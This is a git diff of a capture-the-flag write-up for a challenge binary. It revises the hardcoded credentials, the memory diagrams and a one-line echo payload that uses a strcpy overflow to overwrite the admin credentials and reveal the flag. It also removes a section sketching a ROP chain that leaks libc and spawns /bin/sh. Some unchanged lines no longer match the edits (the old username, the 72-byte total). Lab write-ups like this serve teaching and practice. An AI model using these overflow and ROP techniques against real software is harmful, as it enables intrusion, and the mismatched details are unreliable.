@@ -25,50 +25,44 @@ into the binary, which can be fetched either using `strings`, or retrieved by
 looking at the `user_table_g` array in a decompiler like `ghidra`.
 
 truncated strings output
+
 ```
-_ITM_registerTMCloneTable
+GLIBC_2.2.5
+__gmon_start__
 PTE1
-H= A@
--- NYPD Terminal v1 --
+-- NYPD Terminal --
 1. Change username
 2. Admin login
-3. Exit
+3. Show suspects
+4. Exit
 Username:
 Enter security code:
-cristina33
+cors33                  <- username
+aW5ub2NlbnQ=            <- password
+Suspect %d: %20s, digital footprint %20s.
+netrunner2d             <- admin user
 Intruder!
-01843101
+2d9d90b636318a          <- admin password
 flag.txt
 Failed to allocate memory for buffer, cannot proceed.
-Only you can be trusted with this... %s
+One of these things is not like the other... %s
+Authentication failure.
+Enter new username:
+10.0.0.254
+10.0.0.20
+j@k3
+terminal1
+ssh %s@%s
+%a %b %d %k:%M:%S %Z 1933
+Linux %s 6.1.21-v8+ #1642 SMP PREEMPT %s aarch64
+Last login: %s from %s
 ;*3$"
-hoover95
-7123308
-runner86
-7299126
-kaylined        <- this is a username
-5381272         <- this is a password
-lenscroft12
-7299126
-GCC: (GNU) 14.2.1 20240805
-GCC: (GNU) 14.2.1 20240910
-chal.c
-```
-
-a user may be able to login with any of the username/security code pairs
-seen below:
-
-```
-hoover95: 7123308
-runner86: 7299126
-kaylined: 5381272
-lenscroft12: 7299126
 ```
 
 additionally, the program allows authenticated users to change their username
 (which is the name of the user at runtime), and attempt an "Admin login". in the
 latter feature, the program attempts to check whether the user has been
-authenticated as `cristina33: 01843101`. assuming the right credentials were
+authenticated as `netrunner2d:2d9d90b636318a`. assuming the right credentials were
 provided, then this prints out the flag, and exits
 
 the issue faced here? we can never actually sign in as `cristina33`. in theory,
@@ -77,7 +71,7 @@ security code. as such, we would be unable to log in
 
 in theory, at least
 
-## first solve - overwriting credentials
+## solve - overwriting credentials
 
 this exploit namely abuses the overflow caused by `strcpy` in
 `change_username(char*)`.
@@ -93,12 +87,12 @@ main:creds_buf
 +---------------+ -,
 |               |  |
 |   username    |  |
-|     (32B)     |  |
+|     (48B)     |  |
 |               |  |
 +---------------+   } 72B in size
 |               |  |
 | security code |  |
-|     (32B)     |  |
+|     (48B)     |  |
 |               |  |
 +---------------+ -`
 ```
@@ -108,12 +102,16 @@ after logging in, the `creds_buf` will look something like the following:
 ```
 main:creds_buf
 +user----+
-|kaylined|
+|cors33  |
+|        |
+|        |
 |        |
 |        |
 |        |
 +pass----+
-|5381272 |
+|aW5ub2Nl|
+|bnQ=    |
+|        |
 |        |
 |        |
 |        |
@@ -130,18 +128,22 @@ than just the username. this is particularly important, as the username is
 updated by copying the new username into the `creds_buf` using `strcpy`, which
 copies data without worrying about overflowing data.
 
-that is, a payload of 33 `a`-s, which goes beyond the length of the username
+that is, a payload of 49 `z`-s, which goes beyond the length of the username
 section of the `creds_buf`, the updated `creds_buf` to the following:
 
 ```
 main:creds_buf
 +user----+
-|aaaaaaaa|
-|aaaaaaaa|
-|aaaaaaaa|
-|aaaaaaaa|
-+code----+
-|a 81272 |
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
++pass----+
+|z 5ub2Nl|
+|bnQ=    |
+|        |
 |        |
 |        |
 |        |
@@ -155,12 +157,16 @@ comparing the final nullbyte. therefore, a valid username match would be
 ```
 main:creds_buf
 +user----+
-|cristina| <- matches `cristina33`
-|33aaaaaa|
-|aaaaaaaa|
-|aaaaaaaa|
-+code----+
-|a 81272 |
+|netrunne| <- matches `netrunner2d`
+|r2dzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
++pass----+
+|z 5ub2Nl|
+|bnQ=    |
+|        |
 |        |
 |        |
 |        |
@@ -175,12 +181,16 @@ so, we write in the other security code as well
 ```
 main:creds_buf
 +user----+
-|cristina| <- matches `cristina33`
-|33aaaaaa|
-|aaaaaaaa|
-|aaaaaaaa|
-+code----+
-|01843101| <- matches `01843101`
+|netrunne| <- matches `netrunner2d`
+|r2dzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
+|zzzzzzzz|
++pass----+
+|2d9d90b6|
+|36318a  |
+|        |
 |        |
 |        |
 |        |
@@ -194,27 +204,5 @@ this has been written into the solve script, but a single-line bash line that
 can be run to generate the payload is the following:
 
 ```sh
-echo -e "kaylined\n5381272\n1\ncristina33aaaaaaaaaaaaaaaaaaaaaa01843101\n2" | ./overflow1
+echo -e "cors33\naW5ub2NlbnQ=\n1\nnetrunner2dzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz2d9d90b636318a\n2" | ./overflow1
 ```
-
-## second solve - shell access 
-
-disclaimer: this is how I used Return Oriented Programming (ROP) to eventually
-give me access to a `/bin/sh` process. this does get complicated, and I will not
-be walking through it as I did for the data overwrite above.
-
-although the `fgets` call does not overflow the local buffer made within the
-function, the 72 byte buffer is passed by reference, and copied to it. as such,
-the source buffer is being copied into a smaller destination buffer, allowing
-the return address of `main` to be overwritten.
-
-without PIE, and without stack canaries, the return address can just be
-immediately overwritten. as such, a ROP chain can be generated (using
-pwntools.ROP) to leak GOT entries, determining both what version of `libc` is
-being used (based off page offsets) and where `libc` is loaded in memory.
-
-as a result, using `plt.puts` to `puts` the `got.puts`, the location where
-`libc` is loaded in memory can be resolved, and then a ROP chain off `libc` can
-be executed such that `system("/bin/sh\0")` is run
-
-then shell access (yippee)!
